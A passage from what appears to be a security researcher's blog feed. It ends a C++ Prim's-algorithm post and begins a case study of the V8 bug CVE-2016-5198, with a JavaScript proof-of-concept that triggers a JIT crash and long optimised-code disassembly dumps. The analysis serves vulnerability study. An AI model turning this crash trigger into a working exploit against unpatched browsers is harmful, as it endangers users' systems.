class="keyword">int</span> index;</span><br><span class="line">    <span class="keyword">int</span> flag;</span><br><span class="line">&#125; F;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">create</span><span class="params">(Graph &amp;G, <span class="keyword">int</span> n, <span class="keyword">int</span> e)</span> </span>&#123;</span><br><span class="line">    <span class="keyword">int</span> i, j, k, w;</span><br><span class="line">    <span class="keyword">char</span> a, b;</span><br><span class="line">    <span class="keyword">for</span> (i = <span class="number">0</span>; i &lt; n; i++)</span><br><span class="line">        <span class="built_in">cin</span> &gt;&gt; G.data[i];</span><br><span class="line">    <span class="keyword">for</span> (i = <span class="number">0</span>; i &lt; n; i++)</span><br><span class="line">        <span class="keyword">for</span> (j = <span class="number">0</span>; j &lt; n; j++) &#123;</span><br><span class="line">            <span class="keyword">if</span> (i == j)</span><br><span class="line">                G.edge[i][j] = <span class="number">0</span>;</span><br><span class="line">            <span class="keyword">else</span></span><br><span class="line">                G.edge[i][j] = inf;<span class="comment">//模板里是G.edge[i][j]=100;</span></span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">for</span> (k = <span class="number">0</span>; k &lt; e; k++) &#123;</span><br><span class="line">        <span class="built_in">cin</span> &gt;&gt; a;</span><br><span class="line">        <span class="built_in">cin</span> &gt;&gt; b;</span><br><span class="line">        <span class="built_in">cin</span> &gt;&gt; w;</span><br><span class="line">        <span class="keyword">for</span> (i = <span class="number">0</span>; i &lt; n; i++)</span><br><span class="line">            <span class="keyword">if</span> (G.data[i] == a) <span class="keyword">break</span>;</span><br><span class="line">        <span class="keyword">for</span> (j = <span class="number">0</span>; j &lt; n; j++)</span><br><span class="line">            <span class="keyword">if</span> (G.data[j] == b) <span class="keyword">break</span>;</span><br><span class="line"></span><br><span class="line">        G.edge[i][j] = w;</span><br><span class="line">        G.edge[j][i] = w;</span><br><span class="line">    &#125;</span><br><span class="line">    G.n = n;</span><br><span class="line">    G.e = e;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">Prim</span><span class="params">(Graph &amp;G, <span class="keyword">int</span> v)</span> </span>&#123;</span><br><span class="line">    <span class="keyword">int</span> lowcost[<span class="number">100</span>];</span><br><span class="line">    <span class="keyword">int</span> min, closest[<span class="number">100</span>], i, j, k;</span><br><span class="line">    <span class="keyword">for</span> (i = <span class="number">0</span>; i &lt; G.n; i++) &#123;</span><br><span class="line">        lowcost[i] = G.edge[v][i];</span><br><span class="line">        closest[i] = v;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">for</span> (i = <span class="number">1</span>; i &lt; G.n; i++) &#123;</span><br><span class="line">        min = inf;</span><br><span class="line">        <span class="keyword">for</span> (j = <span class="number">0</span>; j &lt; G.n; j++) &#123;</span><br><span class="line">            <span class="keyword">if</span> (lowcost[j] &amp;&amp; lowcost[j] &lt; min) &#123;</span><br><span class="line">                min = lowcost[j];</span><br><span class="line">                k = j;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="built_in">cout</span> &lt;&lt; <span class="string">'('</span> &lt;&lt; G.data[closest[k]] &lt;&lt; <span class="string">','</span> &lt;&lt; G.data[k] &lt;&lt; <span class="string">')'</span>;</span><br><span class="line">        lowcost[k] = <span class="number">0</span>;</span><br><span class="line">        <span class="keyword">for</span> (j = <span class="number">0</span>; j &lt; G.n; j++)</span><br><span class="line">            <span class="keyword">if</span> (G.edge[k][j] &amp;&amp; G.edge[k][j] &lt; lowcost[j]) &#123;</span><br><span class="line">                lowcost[j] = G.edge[k][j];<span class="comment">//更新距离</span></span><br><span class="line">                closest[j] = k;</span><br><span class="line">            &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">()</span> </span>&#123;</span><br><span class="line">    Graph my;</span><br><span class="line">    <span class="keyword">int</span> n, e;</span><br><span class="line">    <span class="built_in">cin</span> &gt;&gt; n &gt;&gt; e;</span><br><span class="line">    create(my, n, e);</span><br><span class="line">    Prim(my, <span class="number">0</span>);</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></p>]]></content>
    
    <summary type="html">
    
      
      
        &lt;h2 id=&quot;简单背包问题&quot;&gt;&lt;a href=&quot;#简单背包问题&quot; class=&quot;headerlink&quot; title=&quot;简单背包问题&quot;&gt;&lt;/a&gt;简单背包问题&lt;/h2&gt;&lt;p&gt;&lt;img src=&quot;http://onc55v8te.bkt.clouddn.com/2018-06-28-
      
    
    </summary>
    
      <category term="杂项" scheme="http://eternalsakura13.com/categories/%E6%9D%82%E9%A1%B9/"/>
    
    
  </entry>
  
  <entry>
    <title>case study:cve-2016-5198</title>
    <link href="http://eternalsakura13.com/2018/06/26/CVE-2016-5198/"/>
    <id>http://eternalsakura13.com/2018/06/26/CVE-2016-5198/</id>
    <published>2018-06-26T06:24:05.511Z</published>
    <updated>2018-06-27T12:50:11.031Z</updated>
    
    <content type="html"><![CDATA[<h2 id="bugs"><a href="#bugs" class="headerlink" title="bugs"></a>bugs</h2><p><a href="https://bugs.chromium.org/p/chromium/issues/detail?id=659475" target="_blank" rel="noopener">https://bugs.chromium.org/p/chromium/issues/detail?id=659475</a><br><a href="https://chromium.googlesource.com/v8/v8/+/2bd7464ec1efc9eb24a38f7400119a5f2257f6e6" target="_blank" rel="noopener">https://chromium.googlesource.com/v8/v8/+/2bd7464ec1efc9eb24a38f7400119a5f2257f6e6</a></p><h2 id="poc"><a href="#poc" class="headerlink" title="poc"></a>poc</h2><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">Ctor</span>(<span class="params"></span>) </span>&#123;</span><br><span class="line">n = <span class="keyword">new</span> <span class="built_in">Set</span>();</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">Check</span>(<span class="params"></span>) </span>&#123;</span><br><span class="line">n.xyz = <span class="number">0x826852f4</span>;</span><br><span class="line"><span class="built_in">parseInt</span>(<span class="string">'AAAAAAAA'</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span>(<span class="keyword">var</span> i=<span class="number">0</span>; i&lt;<span class="number">2000</span>; ++i) &#123;</span><br><span class="line">Ctor();</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span>(<span class="keyword">var</span> i=<span class="number">0</span>; i&lt;<span class="number">2000</span>; ++i) &#123;</span><br><span class="line">Check();</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">Ctor();</span><br><span class="line">Check();</span><br><span class="line">print(<span class="string">"finish"</span>);</span><br></pre></td></tr></table></figure><h2 id="crash"><a href="#crash" class="headerlink" title="crash"></a>crash</h2><p><img src="http://onc55v8te.bkt.clouddn.com/2018-06-26-062506.png" alt=""><br><img src="http://onc55v8te.bkt.clouddn.com/2018-06-26-062542.png" alt=""></p><h2 id="JIT-Optimized-Code"><a href="#JIT-Optimized-Code" class="headerlink" title="JIT Optimized Code"></a>JIT Optimized Code</h2><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">for(var i=0; i&lt;2000; ++i) &#123;</span><br><span class="line">Ctor();</span><br><span class="line">&#125;</span><br><span class="line">for(var i=0; i&lt;2000; ++i) &#123;</span><br><span class="line">Check();</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>可以看到Ctor和Check会被优化<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">parallels@ubuntu:~/v8/v8/out.gn/x64.debug$ ./d8 --print_code test.js &gt; code</span><br></pre></td></tr></table></figure></p><h3 id="Ctor"><a href="#Ctor" class="headerlink" title="Ctor"></a>Ctor</h3><h4 id="优化前"><a href="#优化前" class="headerlink" title="优化前"></a>优化前</h4><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br></pre></td><td class="code"><pre><span class="line">--- Raw source ---</span><br><span class="line">() &#123;</span><br><span class="line">n = new Set();</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">--- Code ---</span><br><span class="line">source_position = 13</span><br><span class="line">kind = FUNCTION</span><br><span class="line">name = Ctor</span><br><span class="line">compiler = full-codegen</span><br><span class="line">Instructions (size = 188)</span><br><span class="line">0x35680eb84d40     0  55             push rbp</span><br><span class="line">0x35680eb84d41     1  4889e5         REX.W movq rbp,rsp</span><br><span class="line">0x35680eb84d44     4  56             push rsi</span><br><span class="line">0x35680eb84d45     5  57             push rdi</span><br><span class="line">0x35680eb84d46     6  488b4f2f       REX.W movq rcx,[rdi+0x2f]</span><br><span class="line">0x35680eb84d4a    10  488b490f       REX.W movq rcx,[rcx+0xf]</span><br><span class="line">0x35680eb84d4e    14  83411b01       addl [rcx+0x1b],0x1</span><br><span class="line">0x35680eb84d52    18  493ba5600c0000 REX.W cmpq rsp,[r13+0xc60]</span><br><span class="line">0x35680eb84d59    25  7305           jnc 32  (0x35680eb84d60)</span><br><span class="line">0x35680eb84d5b    27  e880dbf5ff     call StackCheck  (0x35680eae28e0)    ;; code: BUILTIN</span><br><span class="line">0x35680eb84d60    32  48b80000000004000000 REX.W movq rax,0x400000000</span><br><span class="line">0x35680eb84d6a    42  e871f6ffff     call 0x35680eb843e0     ;; code: LOAD_GLOBAL_IC</span><br><span class="line">0x35680eb84d6f    47  50             push rax</span><br><span class="line">0x35680eb84d70    48  33c0           xorl rax,rax</span><br><span class="line">0x35680eb84d72    50  488b3c24       REX.W movq rdi,[rsp]</span><br><span class="line">0x35680eb84d76    54  488b5df0       REX.W movq rbx,[rbp-0x10]</span><br><span class="line">0x35680eb84d7a    58  488b5b2f       REX.W movq rbx,[rbx+0x2f]</span><br><span class="line">0x35680eb84d7e    62  488b5b0f       REX.W movq rbx,[rbx+0xf]</span><br><span class="line">0x35680eb84d82    66  48ba0000000002000000 REX.W movq rdx,0x200000000</span><br><span class="line">0x35680eb84d8c    76  e84f85f3ff     call 0x35680eabd2e0     ;; code: STUB, CallConstructStub, minor: 0</span><br><span class="line">0x35680eb84d91    81  488b75f8       REX.W movq rsi,[rbp-0x8]</span><br><span class="line">0x35680eb84d95    85  488b5627       REX.W movq rdx,[rsi+0x27]</span><br><span class="line">0x35680eb84d99    89  488b521f       REX.W movq rdx,[rdx+0x1f]</span><br><span class="line">0x35680eb84d9d    93  48b9d19030abf6000000 REX.W movq rcx,0xf6ab3090d1    ;; object: 0xf6ab3090d1 &lt;String[1]: n&gt;</span><br><span class="line">0x35680eb84da7   103  48bf0000000006000000 REX.W movq rdi,0x600000000</span><br><span class="line">0x35680eb84db1   113  e8aad4f0ff     call 0x35680ea92260     ;; code: STORE_IC</span><br><span class="line">0x35680eb84db6   118  488b75f8       REX.W movq rsi,[rbp-0x8]</span><br><span class="line">0x35680eb84dba   122  498b45a0       REX.W movq rax,[r13-0x60]</span><br><span class="line">0x35680eb84dbe   126  48bb79b962be00370000 REX.W movq rbx,0x3700be62b979    ;; object: 0x3700be62b979 Cell for 6144</span><br><span class="line">0x35680eb84dc8   136  83430bd1       addl [rbx+0xb],0xd1</span><br><span class="line">0x35680eb84dcc   140  791f           jns 173  (0x35680eb84ded)</span><br><span class="line">0x35680eb84dce   142  50             push rax</span><br><span class="line">0x35680eb84dcf   143  e88cdaf5ff     call InterruptCheck  (0x35680eae2860)    ;; code: BUILTIN</span><br><span class="line">0x35680eb84dd4   148  58             pop rax</span><br><span class="line">0x35680eb84dd5   149  48bb79b962be00370000 REX.W movq rbx,0x3700be62b979    ;; object: 0x3700be62b979 Cell for 6144</span><br><span class="line">0x35680eb84ddf   159  49ba0000000000180000 REX.W movq r10,0x180000000000</span><br><span class="line">0x35680eb84de9   169  4c895307       REX.W movq [rbx+0x7],r10</span><br><span class="line">0x35680eb84ded   173  c9             leavel</span><br><span class="line">0x35680eb84dee   174  c20800         ret 0x8</span><br><span class="line">0x35680eb84df1   177  0f1f8000000000 nop</span><br></pre></td></tr></table></figure><h4 id="优化后"><a href="#优化后" class="headerlink" title="优化后"></a>优化后</h4><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br></pre></td><td class="code"><pre><span class="line">--- Raw source ---</span><br><span class="line">() &#123;</span><br><span class="line">n = new Set();</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">--- Optimized code ---</span><br><span class="line">optimization_id = 0</span><br><span class="line">source_position = 13</span><br><span class="line">kind = OPTIMIZED_FUNCTION</span><br><span class="line">name = Ctor</span><br><span class="line">stack_slots = 5</span><br><span class="line">compiler = crankshaft</span><br><span class="line">Instructions (size = 218)</span><br><span class="line">0x35680eb868c0     0  55             push rbp</span><br><span class="line">0x35680eb868c1     1  4889e5         REX.W movq rbp,rsp</span><br><span class="line">0x35680eb868c4     4  56             push rsi</span><br><span class="line">0x35680eb868c5     5  57             push rdi</span><br><span class="line">0x35680eb868c6     6  4883ec08       REX.W subq rsp,0x8</span><br><span class="line">0x35680eb868ca    10  488b45f8       REX.W movq rax,[rbp-0x8]</span><br><span class="line">0x35680eb868ce    14  488945e8       REX.W movq [rbp-0x18],rax</span><br><span class="line">0x35680eb868d2    18  488bf0         REX.W movq rsi,rax</span><br><span class="line">0x35680eb868d5    21  493ba5600c0000 REX.W cmpq rsp,[r13+0xc60]</span><br><span class="line">0x35680eb868dc    28  7305           jnc 35  (0x35680eb868e3)</span><br><span class="line">0x35680eb868de    30  e8fdbff5ff     call StackCheck  (0x35680eae28e0)    ;; code: BUILTIN</span><br><span class="line">0x35680eb868e3    35  49bae95b61be00370000 REX.W movq r10,0x3700be615be9    ;; object: 0x3700be615be9 &lt;JS Function Set (SharedFunctionInfo 0xf6ab31cb31)&gt;</span><br><span class="line">0x35680eb868ed    45  4152           push r10</span><br><span class="line">0x35680eb868ef    47  48bae95b61be00370000 REX.W movq rdx,0x3700be615be9    ;; object: 0x3700be615be9 &lt;JS Function Set (SharedFunctionInfo 0xf6ab31cb31)&gt;</span><br><span class="line">0x35680eb868f9    57  48bae95b61be00370000 REX.W movq rdx,0x3700be615be9    ;; object: 0x3700be615be9 &lt;JS Function Set (SharedFunctionInfo 0xf6ab31cb31)&gt;</span><br><span class="line">0x35680eb86903    67  33c0           xorl rax,rax</span><br><span class="line">0x35680eb86905    69  488b75e8       REX.W movq rsi,[rbp-0x18]</span><br><span class="line">0x35680eb86909    73  488bfa         REX.W movq rdi,rdx</span><br><span class="line">0x35680eb8690c    76  e8af6bf3ff     call Construct  (0x35680eabd4c0)    ;; code: BUILTIN</span><br><span class="line">0x35680eb86911    81  a801           test al,0x1</span><br><span class="line">0x35680eb86913    83  0f8458000000   jz 177  (0x35680eb86971)</span><br><span class="line">0x35680eb86919    89  49ba0965f05fe10a0000 REX.W movq r10,0xae15ff06509    ;; object: 0xae15ff06509 &lt;Map(FAST_HOLEY_SMI_ELEMENTS)&gt;</span><br><span class="line">0x35680eb86923    99  4c3950ff       REX.W cmpq [rax-0x1],r10</span><br><span class="line">0x35680eb86927   103  0f8549000000   jnz 182  (0x35680eb86976)</span><br><span class="line">0x35680eb8692d   109  48bbc1bd62be00370000 REX.W movq rbx,0x3700be62bdc1    ;; object: 0x3700be62bdc1 PropertyCell for 0x18b67513e51 &lt;a Set with map 0xae15ff06509&gt;</span><br><span class="line">0x35680eb86937   119  4889430f       REX.W movq [rbx+0xf],rax</span><br><span class="line">0x35680eb8693b   123  488d530f       REX.W leaq rdx,[rbx+0xf]</span><br><span class="line">0x35680eb8693f   127  48250000f8ff   REX.W and rax,0xfffffffffff80000</span><br><span class="line">0x35680eb86945   133  f6400802       testb [rax+0x8],0x2</span><br><span class="line">0x35680eb86949   137  7415           jz 160  (0x35680eb86960)</span><br><span class="line">0x35680eb8694b   139  48c7c00000f8ff REX.W movq rax,0xfff80000</span><br><span class="line">0x35680eb86952   146  4823c3         REX.W andq rax,rbx</span><br><span class="line">0x35680eb86955   149  f6400804       testb [rax+0x8],0x4</span><br><span class="line">0x35680eb86959   153  7405           jz 160  (0x35680eb86960)</span><br><span class="line">0x35680eb8695b   155  e8c0f6ffff     call 0x35680eb86020     ;; code: STUB, RecordWriteStub, minor: 8707</span><br><span class="line">0x35680eb86960   160  48b8112330abf6000000 REX.W movq rax,0xf6ab302311    ;; object: 0xf6ab302311 &lt;undefined&gt;</span><br><span class="line">0x35680eb8696a   170  488be5         REX.W movq rsp,rbp</span><br><span class="line">0x35680eb8696d   173  5d             pop rbp</span><br><span class="line">0x35680eb8696e   174  c20800         ret 0x8</span><br><span class="line">0x35680eb86971   177  e89ed6d7ff     call 0x35680e904014     ;; deoptimization bailout 2</span><br><span class="line">0x35680eb86976   182  e8a3d6d7ff     call 0x35680e90401e     ;; deoptimization bailout 3</span><br><span class="line">0x35680eb8697b   187  90             nop</span><br></pre></td></tr></table></figure><h4 id="强调"><a href="#强调" class="headerlink" title="强调"></a>强调</h4><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">0x35680eb8690c    76  e8af6bf3ff     call Construct  (0x35680eabd4c0)    ;; code: BUILTIN ----&gt;</span><br><span class="line">0x35680eb86911    81  a801           test al,0x1</span><br><span class="line">0x35680eb86913    83  0f8458000000   jz 177  (0x35680eb86971)</span><br><span class="line">0x35680eb86919    89  49ba0965f05fe10a0000 REX.W movq r10,0xae15ff06509    ;; object: 0xae15ff06509 &lt;Map(FAST_HOLEY_SMI_ELEMENTS)&gt;</span><br><span class="line">0x35680eb86923    99  4c3950ff       REX.W cmpq [rax-0x1],r10</span><br><span class="line">0x35680eb86927   103  0f8549000000   jnz 182  (0x35680eb86976)</span><br><span class="line">0x35680eb8692d   109  48bbc1bd62be00370000 REX.W movq rbx,0x3700be62bdc1    ;; object: 0x3700be62bdc1 PropertyCell for 0x18b67513e51 &lt;a Set with map 0xae15ff06509&gt; ----&gt;</span><br></pre></td></tr></table></figure><h3 id="Check"><a href="#Check" class="headerlink" title="Check"></a>Check</h3><h4 id="优化前-1"><a href="#优化前-1" class="headerlink" title="优化前"></a>优化前</h4><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br></pre></td><td class="code"><pre><span class="line">--- Raw source ---</span><br><span class="line">() &#123;</span><br><span class="line">n.xyz = 0x826852f4;</span><br><span class="line">parseInt(&apos;AAAAAAAA&apos;);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">--- Code ---</span><br><span class="line">source_position = 50</span><br><span class="line">kind = FUNCTION</span><br><span class="line">name = Check</span><br><span class="line">compiler = full-codegen</span><br><span class="line">Instructions (size = 220)</span><br><span class="line">0x35680eb86a00     0  55             push rbp</span><br><span class="line">0x35680eb86a01     1  4889e5         REX.W movq rbp,rsp</span><br><span class="line">0x35680eb86a04     4  56             push rsi</span><br><span class="line">0x35680eb86a05     5  57             push rdi</span><br><span class="line">0x35680eb86a06     6  488b4f2f       REX.W movq rcx,[rdi+0x2f]</span><br><span class="line">0x35680eb86a0a    10  488b490f       REX.W movq rcx,[rcx+0xf]</span><br><span class="line">0x35680eb86a0e    14  83411b01       addl [rcx+0x1b],0x1</span><br><span class="line">0x35680eb86a12    18  493ba5600c0000 REX.W cmpq rsp,[r13+0xc60]</span><br><span class="line">0x35680eb86a19    25  7305           jnc 32  (0x35680eb86a20)</span><br><span class="line">0x35680eb86a1b    27  e8c0bef5ff     call StackCheck  (0x35680eae28e0)    ;; code: BUILTIN</span><br><span class="line">0x35680eb86a20    32  48b80000000002000000 REX.W movq rax,0x200000000</span><br><span class="line">0x35680eb86a2a    42  e8b1d9ffff     call 0x35680eb843e0     ;; code: LOAD_GLOBAL_IC</span><br><span class="line">0x35680eb86a2f    47  50             push rax</span><br><span class="line">0x35680eb86a30    48  48b8e9c362be00370000 REX.W movq rax,0x3700be62c3e9    ;; object: 0x3700be62c3e9 &lt;Number: 2.18788e+09&gt;</span><br><span class="line">0x35680eb86a3a    58  5a             pop rdx</span><br><span class="line">0x35680eb86a3b    59  48b919b062be00370000 REX.W movq rcx,0x3700be62b019    ;; object: 0x3700be62b019 &lt;String[3]: xyz&gt;</span><br><span class="line">0x35680eb86a45    69  48bf0000000004000000 REX.W movq rdi,0x400000000</span><br><span class="line">0x35680eb86a4f    79  e80cb8f0ff     call 0x35680ea92260     ;; code: STORE_IC</span><br><span class="line">0x35680eb86a54    84  488b75f8       REX.W movq rsi,[rbp-0x8]</span><br><span class="line">0x35680eb86a58    88  48b80000000008000000 REX.W movq rax,0x800000000</span><br><span class="line">0x35680eb86a62    98  e879d9ffff     call 0x35680eb843e0     ;; code: LOAD_GLOBAL_IC</span><br><span class="line">0x35680eb86a67   103  50             push rax</span><br><span class="line">0x35680eb86a68   104  49ba112330abf6000000 REX.W movq r10,0xf6ab302311    ;; object: 0xf6ab302311 &lt;undefined&gt;</span><br><span class="line">0x35680eb86a72   114  4152           push r10</span><br><span class="line">0x35680eb86a74   116  49ba39b062be00370000 REX.W movq r10,0x3700be62b039    ;; object: 0x3700be62b039 &lt;String[8]: AAAAAAAA&gt;</span><br><span class="line">0x35680eb86a7e   126  4152           push r10</span><br><span class="line">0x35680eb86a80   128  48ba0000000006000000 REX.W movq rdx,0x600000000</span><br><span class="line">0x35680eb86a8a   138  488b7c2410     REX.W movq rdi,[rsp+0x10]</span><br><span class="line">0x35680eb86a8f   143  b801000000     movl rax,0x1</span><br><span class="line">0x35680eb86a94   148  e8a7ddffff     call 0x35680eb84840     ;; code: CALL_IC</span><br><span class="line">0x35680eb86a99   153  488b75f8       REX.W movq rsi,[rbp-0x8]</span><br><span class="line">0x35680eb86a9d   157  4883c408       REX.W addq rsp,0x8</span><br><span class="line">0x35680eb86aa1   161  498b45a0       REX.W movq rax,[r13-0x60]</span><br><span class="line">0x35680eb86aa5   165  48bbc9c462be00370000 REX.W movq rbx,0x3700be62c4c9    ;; object: 0x3700be62c4c9 Cell for 6144</span><br><span class="line">0x35680eb86aaf   175  83430bd1       addl [rbx+0xb],0xd1</span><br><span class="line">0x35680eb86ab3   179  791f           jns 212  (0x35680eb86ad4)</span><br><span class="line">0x35680eb86ab5   181  50             push rax</span><br><span class="line">0x35680eb86ab6   182  e8a5bdf5ff     call InterruptCheck  (0x35680eae2860)    ;; code: BUILTIN</span><br><span class="line">0x35680eb86abb   187  58             pop rax</span><br><span class="line">0x35680eb86abc   188  48bbc9c462be00370000 REX.W movq rbx,0x3700be62c4c9    ;; object: 0x3700be62c4c9 Cell for 6144</span><br><span class="line">0x35680eb86ac6   198  49ba0000000000180000 REX.W movq r10,0x180000000000</span><br><span class="line">0x35680eb86ad0   208  4c895307       REX.W movq [rbx+0x7],r10</span><br><span class="line">0x35680eb86ad4   212  c9             leavel</span><br><span class="line">0x35680eb86ad5   213  c20800         ret 0x8</span><br><span class="line"></span><br><span class="line">Source positions:</span><br><span class="line"> pc offset  position</span><br><span class="line">         0        50</span><br><span class="line">        32        55  statement</span><br><span class="line">        32        55</span><br><span class="line">        58        61</span><br><span class="line">        88        75  statement</span><br><span class="line">        88        75</span><br><span class="line">       128        75</span><br><span class="line">       212        97  statement</span><br><span class="line"></span><br><span class="line">Deoptimization Output Data (deopt points = 0)</span><br><span class="line"></span><br><span class="line">Back edges (size = 0)</span><br><span class="line">ast_id  pc_offset  loop_depth</span><br><span class="line"></span><br><span class="line">0x3700be62c4f9: [TypeFeedbackInfo]</span><br><span class="line"> - ic_total_count: 3, ic_with_type_info_count: 0, ic_generic_count: 0</span><br><span class="line"></span><br><span class="line">RelocInfo (size = 12)</span><br><span class="line">0x35680eb86a1c  code target (BUILTIN)  (0x35680eae28e0)</span><br><span class="line">0x35680eb86a2b  code target (LOAD_GLOBAL_IC)  (0x35680eb843e0)</span><br><span class="line">0x35680eb86a32  embedded object  (0x3700be62c3e9 &lt;Number: 2.18788e+09&gt;)</span><br><span class="line">0x35680eb86a3d  embedded object  (0x3700be62b019 &lt;String[3]: xyz&gt;)</span><br><span class="line">0x35680eb86a50  code target (STORE_IC)  (0x35680ea92260)</span><br><span class="line">0x35680eb86a63  code target (LOAD_GLOBAL_IC)  (0x35680eb843e0)</span><br><span class="line">0x35680eb86a6a  embedded object  (0xf6ab302311 &lt;undefined&gt;)</span><br><span class="line">0x35680eb86a76  embedded object  (0x3700be62b039 &lt;String[8]: AAAAAAAA&gt;)</span><br><span 